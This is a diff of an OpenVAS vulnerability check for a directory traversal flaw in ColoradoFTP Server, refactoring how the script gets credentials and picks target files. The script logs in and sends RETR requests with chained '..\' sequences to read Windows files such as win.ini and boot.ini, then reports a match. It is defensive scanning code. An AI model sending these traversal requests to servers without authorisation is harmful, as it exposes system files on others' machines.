@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_colorado_ftp_server_dir_trav_vun.nasl 12455 2018-11-21 09:17:27Z cfischer $
+# $Id: gb_colorado_ftp_server_dir_trav_vun.nasl 13497 2019-02-06 10:45:54Z cfischer $
 #
 # ColoradoFTP Server Directory Traversal Vulnerability
 #
@@ -29,10 +29,10 @@ CPE = "cpe:/a:colorado:coloradoftpserver";
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.807877");
-  script_version("$Revision: 12455 $");
+  script_version("$Revision: 13497 $");
   script_tag(name:"cvss_base", value:"6.4");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:N");
-  script_tag(name:"last_modification", value:"$Date: 2018-11-21 10:17:27 +0100 (Wed, 21 Nov 2018) $");
+  script_tag(name:"last_modification", value:"$Date: 2019-02-06 11:45:54 +0100 (Wed, 06 Feb 2019) $");
   script_tag(name:"creation_date", value:"2016-08-17 16:19:22 +0530 (Wed, 17 Aug 2016)");
   script_name("ColoradoFTP Server Directory Traversal Vulnerability");
 
@@ -64,7 +64,7 @@ if(description)
   script_category(ACT_ATTACK);
   script_copyright("Copyright (C) 2016 Greenbone Networks GmbH");
   script_family("FTP");
-  script_dependencies("gb_colorado_ftp_server_detect.nasl", "secpod_ftp_anonymous.nasl");
+  script_dependencies("gb_colorado_ftp_server_detect.nasl");
   script_mandatory_keys("ColoradoFTP/Server/installed");
   script_require_ports("Services/ftp", 21);
   script_xref(name:"URL", value:"http://cftp.coldcore.com");
@@ -73,29 +73,20 @@ if(description)
 
 include("ftp_func.inc");
 include("host_details.inc");
+include("misc_func.inc");
 
 if(!ftpPort = get_app_port(cpe:CPE)){
   exit(0);
 }
 
-## create the socket
 soc = open_sock_tcp(ftpPort);
 if(!soc){
   exit(0);
 }
 
-user = get_kb_item("ftp/login");
-pass = get_kb_item("ftp/password");
-
-## if not user name is given try with anonymous
-if(!user){
-  user = "anonymous";
-}
-
-## if not password is given try with arbitrary email
-if(!pass){
-  pass = string("a@b.com");
-}
+kb_creds = ftp_get_kb_creds();
+user = kb_creds["login"];
+pass = kb_creds["pass"];
 
 login_details = ftp_log_in(socket:soc, user:user, pass:pass);
 if(!login_details)
@@ -104,7 +95,6 @@ if(!login_details)
  exit(0);
 }
 
-## Change to PASV Mode
 ftpPort2 = ftp_get_pasv_port(socket:soc);
 if(!ftpPort2)
 {
@@ -112,7 +102,6 @@ if(!ftpPort2)
   exit(0);
 }
 
-## Open a Socket and Send Crafted request
 soc2 = open_sock_tcp(ftpPort2, transport:get_port_transport(ftpPort));
 if(!soc2)
 {
@@ -120,20 +109,23 @@ if(!soc2)
   exit(0);
 }
 
-## List the possible system files
-files = make_list("windows\\\\win.ini", "boot.ini", "winnt\\\\win.ini");
-foreach file (files)
-{
+files = traversal_files( "Windows" );
+
+foreach pattern(keys(files)) {
+
+  file = files[pattern];
+  file = str_replace( string:file, find:"/", replace:"\\\\" );
+
   file = string ("\\\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\", file);
-  attackreq = string("RETR ", file);
-  send(socket:soc, data:string(attackreq, "\r\n"));
+  req = string("RETR ", file);
+  send(socket:soc, data:string(req, "\r\n"));
 
-  result = ftp_recv_data(socket:soc2);
+  res = ftp_recv_data(socket:soc2);
 
-  if("\WINDOWS" >< result || "; for 16-bit app support" >< result
-                                     || "[boot loader]" >< result)
-  {
-    security_message(ftpPort);
+  if( res && match = egrep( string:res, pattern:"(" + pattern + "|\WINDOWS)", icase:TRUE ) ) {
+    report  = "Used request:  " + req + '\n';
+    report += "Received data: " + match;
+    security_message(port:ftpPort, data:report);
     close(soc2);
     close(soc);
     exit(0);
